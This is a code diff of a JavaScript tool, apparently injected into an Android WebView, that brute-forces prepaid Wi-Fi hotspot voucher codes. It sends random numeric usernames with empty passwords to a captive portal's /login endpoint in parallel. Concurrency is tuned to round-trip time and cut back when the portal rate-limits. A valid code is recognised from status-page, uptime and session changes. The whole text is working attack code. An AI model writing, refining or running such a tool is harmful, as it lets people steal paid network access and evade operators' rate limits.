@@ -1,17 +1,18 @@
 (function() {
-    const CFG = window.FINDER_CONFIG;
-    const TRIED = new Set((CFG.tried || []).slice());
-    const ERRS = [];
-    let stopped = false;
-    let rtt = 500, parallel = 1;
-    let done = 0, errCount = 0, badCount = 0;
+    if (window.__finderRunning) {
+        if (window.AndroidBridge) window.AndroidBridge.log("التخمين يعمل بالفعل");
+        return;
+    }
+    window.__finderRunning = true;
 
-    function log(m) { if (window.AndroidBridge) window.AndroidBridge.log(m); }
-    function progress(c, t, v) { if (window.AndroidBridge) window.AndroidBridge.progress(c, t, v); }
-    function reportFound(v, st) { if (window.AndroidBridge) window.AndroidBridge.found(v, JSON.stringify(st)); }
-    function markBad(v) { if (window.AndroidBridge) window.AndroidBridge.markBad(v); }
-    function markErr(v) { if (window.AndroidBridge) window.AndroidBridge.markErr(v); }
+    const CFG = window.FINDER_CONFIG;
+    if (!CFG) { if (window.AndroidBridge) window.AndroidBridge.log("FINDER_CONFIG مفقود"); window.__finderRunning = false; return; }
+
+    let stopped = false;
     window.stopFinder = function() { stopped = true; };
+
+    function log(m) { try { if (window.AndroidBridge) window.AndroidBridge.log(m); } catch(e){} }
+    function reportFound(v, st) { try { if (window.AndroidBridge) window.AndroidBridge.found(v, JSON.stringify(st)); } catch(e){} }
 
     const sleep = ms => new Promise(r => setTimeout(r, ms));
 
@@ -26,7 +27,6 @@
             }
         } catch(e) { return null; }
     }
-
     function isActive(st) {
         if (!st) return false;
         const li = String(st.logged_in || '').toLowerCase();
@@ -47,9 +47,9 @@
         if (!m) return -1;
         return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
     }
-    async function measureRTT(url, n) {
+    async function measureRTT(url) {
         const times = [];
-        for (let i = 0; i < n; i++) {
+        for (let i = 0; i < 3; i++) {
             const t0 = performance.now();
             try { await fetch(url, { credentials: 'include', cache: 'no-cache' }); times.push(performance.now() - t0); } catch(e) {}
             await sleep(30);
@@ -57,10 +57,10 @@
         return times.length ? times.reduce((a,b)=>a+b,0)/times.length : 500;
     }
     function calcParallel(r) {
-        if (r < 50) return 15;
-        if (r < 100) return 12;
+        if (r < 50) return 12;
+        if (r < 100) return 10;
         if (r < 180) return 8;
-        if (r < 300) return 6;
+        if (r < 300) return 5;
         if (r < 500) return 4;
         if (r < 900) return 3;
         if (r < 1500) return 2;
@@ -73,18 +73,19 @@
         const loginUrl = base + '/login';
 
         log('▶ بدء: ' + base);
-        log('مرشحات سابقة: ' + TRIED.size + ' (تُخطّى)');
 
         const init = await safeJson(statusUrl);
         if (init && isActive(init)) {
             const u = statusUser(init);
-            if (u) { log('✓ كرت مسجل: ' + u); reportFound(u, init); return; }
-            log('⚠ جلسة نشطة، username مخفي'); return;
+            if (u) { log('✓ كرت مسجل: ' + u); reportFound(u, init); window.__finderRunning = false; return; }
+            log('⚠ جلسة نشطة، username مخفي');
+            window.__finderRunning = false;
+            return;
         }
 
         log('⚡ قياس RTT...');
-        rtt = await measureRTT(statusUrl, 3);
-        parallel = Math.min(15, calcParallel(rtt));
+        const rtt = await measureRTT(statusUrl);
+        let parallel = Math.min(12, calcParallel(rtt));
         log('⚡ RTT=' + Math.round(rtt) + 'ms → توازي=' + parallel);
 
         let template = { username: '', password: '', dst: base + '/', popup: 'true' };
@@ -99,16 +100,18 @@
         } catch(e) {}
 
         const maxVal = Math.pow(10, CFG.digits) - 1;
+        const tried = new Set();
         const beforeUp = init ? uptimeSec(init.uptime) : -1;
         const beforeActive = isActive(init);
         const startTime = performance.now();
-        let batchCount = 0, rateLimitHits = 0;
+        let done = 0, batchCount = 0, rateLimitHits = 0;
+        let errCount = 0, badCount = 0;
 
         function gen() {
             for (let k = 0; k < 500; k++) {
                 const num = Math.floor(Math.random() * (maxVal + 1));
                 const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
-                if (!TRIED.has(v)) { TRIED.add(v); return v; }
+                if (!tried.has(v)) { tried.add(v); return v; }
             }
             return null;
         }
@@ -118,7 +121,6 @@
             for (const k in template) body.set(k, template[k]);
             body.set('username', v);
             body.set('password', '');
-            const t0 = performance.now();
             try {
                 const r = await fetch(loginUrl, {
                     method: 'POST', body: body.toString(),
@@ -127,10 +129,8 @@
                     redirect: 'manual'
                 });
                 const loc = r.headers.get('Location') || '';
-                return { v, code: r.status, loc, isFail: /error|fail|invalid|denied/i.test(loc), t: performance.now() - t0 };
-            } catch(e) {
-                return { v, code: 0, err: e.message, isFail: true, t: performance.now() - t0 };
-            }
+                return { v, code: r.status, isFail: /error|fail|invalid|denied/i.test(loc) };
+            } catch(e) { return { v, code: 0, isFail: true, err: e.message }; }
         }
 
         while (done < CFG.attempts && !stopped) {
@@ -139,10 +139,10 @@
                 const v = gen();
                 if (!v) break;
                 done++;
-                progress(done, CFG.attempts, v + ' ⚡' + parallel);
+                try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
                 batch.push(post(v));
             }
-            if (batch.length === 0) { log('⚠ نفدت الأرقام'); break; }
+            if (batch.length === 0) break;
 
             const bStart = performance.now();
             const results = await Promise.all(batch);
@@ -152,76 +152,54 @@
             const limited = results.some(r => r.code === 429 || r.code === 503);
             if (limited) {
                 rateLimitHits++;
-                if (rateLimitHits >= 2) {
-                    parallel = Math.max(1, Math.floor(parallel / 2));
-                    log('🛑 حظر — خفض التوازي إلى ' + parallel);
-                    rateLimitHits = 0;
-                }
+                if (rateLimitHits >= 2) { parallel = Math.max(1, Math.floor(parallel/2)); log('🛑 حظر — توازي=' + parallel); rateLimitHits = 0; }
                 await sleep(CFG.retryDelay);
             } else if (rateLimitHits > 0) rateLimitHits--;
 
             for (const r of results) {
-                if (r.code === 429 || r.code === 503) { log('🛑 حظر ' + r.code + ': ' + r.v); continue; }
-                if (r.code === 0) { errCount++; markErr(r.v); ERRS.push(r.v); log('⚠ خطأ شبكة: ' + r.v + ' — ' + (r.err || 'unknown')); continue; }
-                if (r.code === 404 || r.code === 400) { badCount++; markBad(r.v); continue; }
-                if (r.isFail) { badCount++; markBad(r.v); continue; }
+                if (r.code === 429 || r.code === 503) { log('🛑 حظر ' + r.code); continue; }
+                if (r.code === 0) { errCount++; log('⚠ شبكة: ' + r.v + ' — ' + (r.err||'').substring(0,40)); continue; }
+                if (r.isFail || r.code === 404 || r.code === 400) { badCount++; continue; }
             }
 
-            const needCheck = results.some(r =>
-                r.code > 0 && r.code !== 429 && r.code !== 503 &&
-                r.code !== 404 && r.code !== 400 && !r.isFail);
-
+            const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503 && r.code !== 404 && r.code !== 400 && !r.isFail);
             if (needCheck) {
                 await sleep(20);
                 const st = await safeJson(statusUrl);
                 const u = statusUser(st);
-                if (u) { log('✅ ' + u); reportFound(u, st); return; }
+                if (u) { log('✅ ' + u); reportFound(u, st); window.__finderRunning = false; return; }
                 const up = uptimeSec(st && st.uptime);
                 if (st && isActive(st) && beforeUp > 30 && up >= 0 && up <= 15) {
                     const cand = results.find(r => r.code > 0 && r.code !== 429 && r.code !== 503);
-                    if (cand) { log('✅ uptime reset: ' + cand.v); reportFound(cand.v, st); return; }
+                    if (cand) { log('✅ uptime reset: ' + cand.v); reportFound(cand.v, st); window.__finderRunning = false; return; }
                 }
                 if (st && isActive(st) && !beforeActive && up >= 0 && up <= 15) {
                     const cand = results.find(r => r.code > 0 && r.code !== 429 && r.code !== 503);
-                    if (cand) { log('✅ جلسة: ' + cand.v); reportFound(cand.v, st); return; }
+                    if (cand) { log('✅ جلسة: ' + cand.v); reportFound(cand.v, st); window.__finderRunning = false; return; }
                 }
             }
 
             if (done % CFG.statusEvery < parallel) {
                 const st = await safeJson(statusUrl);
                 const u = statusUser(st);
-                if (u && !TRIED.has(u)) { log('✅ periodic: ' + u); reportFound(u, st); return; }
+                if (u && !tried.has(u)) { log('✅ periodic: ' + u); reportFound(u, st); window.__finderRunning = false; return; }
             }
 
             if (batchCount % CFG.rttEvery === 0) {
                 const perReq = bTime / Math.max(1, batch.length);
-                rtt = rtt * 0.7 + perReq * 0.3;
-                const np = Math.min(15, calcParallel(rtt));
-                if (np !== parallel) { parallel = np; log('⚙ RTT=' + Math.round(rtt) + 'ms → ' + parallel); }
+                const nrtt = rtt * 0.7 + perReq * 0.3;
+                const np = Math.min(12, calcParallel(nrtt));
+                if (np !== parallel) { parallel = np; log('⚙ RTT=' + Math.round(nrtt) + 'ms → ' + parallel); }
             }
 
             if (batchCount % 50 === 0) await sleep(CFG.pause);
         }
 
-        if (ERRS.length > 0 && !stopped) {
-            log('🔁 إعادة ' + ERRS.length + ' فاشل شبكياً...');
-            for (let i = 0; i < ERRS.length && !stopped; i++) {
-                const v = ERRS[i];
-                const r = await post(v);
-                if (r.code > 0 && r.code !== 429 && r.code !== 503) {
-                    await sleep(100);
-                    const st = await safeJson(statusUrl);
-                    if (statusUser(st) === v) { log('✅ محاولة 2: ' + v); reportFound(v, st); return; }
-                    if (r.isFail || r.code === 404) markBad(v);
-                }
-                await sleep(CFG.pause);
-            }
-        }
-
         const sec = ((performance.now() - startTime) / 1000).toFixed(1);
         log('❌ انتهى — ' + done + '/' + CFG.attempts + ' في ' + sec + 's (' + Math.round(done/sec) + '/ث)');
         log('   bad=' + badCount + ' err=' + errCount);
+        window.__finderRunning = false;
     }
 
-    setTimeout(run, 500);
+    setTimeout(run, 300);
 })();
